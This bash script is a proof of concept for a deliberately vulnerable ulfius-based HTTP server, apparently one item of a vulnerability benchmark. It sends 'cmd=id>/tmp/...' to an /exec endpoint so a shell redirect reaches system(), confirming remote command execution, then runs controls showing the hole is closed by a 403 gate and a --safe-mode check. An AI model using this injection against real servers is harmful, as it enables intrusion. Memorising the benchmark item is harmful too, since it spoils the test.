#!/usr/bin/env bash
# PoC for 100_ulfius_C1I1S3
# Axes: C1 (single CLI flag gate) / I1 (direct to system()) / S3 (flag-gated sanitization)
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.
#
# S3 bypass: start server WITH --exec-mode but WITHOUT --safe-mode.
# Without --safe-mode, the has_shell_meta() check is never called, so
# shell metacharacters pass directly to system().
#
# The patched binary (ulfius_server) lives in this directory. If it is absent,
# run:  cd $(dirname $0) && bash build.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/ulfius_server"
WWWROOT="/tmp/poc_100_www"
MARKER="/tmp/poc_100_marker"
PORT=18100

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# ── start server WITH --exec-mode, WITHOUT --safe-mode (S3 bypass) ─────────────
echo "[*] starting ulfius_server with --exec-mode (no --safe-mode) on port $PORT..."
"$BINARY" --port "$PORT" --exec-mode &
SERVER_PID=$!
sleep 0.4

# ── trigger: shell metachar > in cmd param ─────────────────────────────────────
echo "[*] sending payload: cmd=id>$MARKER"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null

# ── verify ─────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control: endpoint returns 403 without --exec-mode ─────────────────
echo "[*] verifying gate: endpoint must return 403 without --exec-mode..."
NEG_PORT=19100
"$BINARY" --port "$NEG_PORT" &
NEG_PID=$!
sleep 0.4
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || true)
kill "$NEG_PID" 2>/dev/null; wait "$NEG_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "403" ]]; then
    echo "[+] gate check passed: got 403 without --exec-mode"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi

# ── S3 demonstration: --safe-mode blocks metacharacters ────────────────────────
echo "[*] verifying S3: --safe-mode blocks metacharacters..."
SAFE_PORT=19101
"$BINARY" --port "$SAFE_PORT" --exec-mode --safe-mode &
SAFE_PID=$!
sleep 0.4
SAFE_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${SAFE_PORT}/exec?cmd=id>${MARKER}" || true)
kill "$SAFE_PID" 2>/dev/null; wait "$SAFE_PID" 2>/dev/null || true
if [[ "$SAFE_CODE" == "400" ]]; then
    echo "[+] S3 check passed: got 400 with --safe-mode (metachar blocked)"
else
    echo "[!] S3 check unexpected response: $SAFE_CODE"
fi
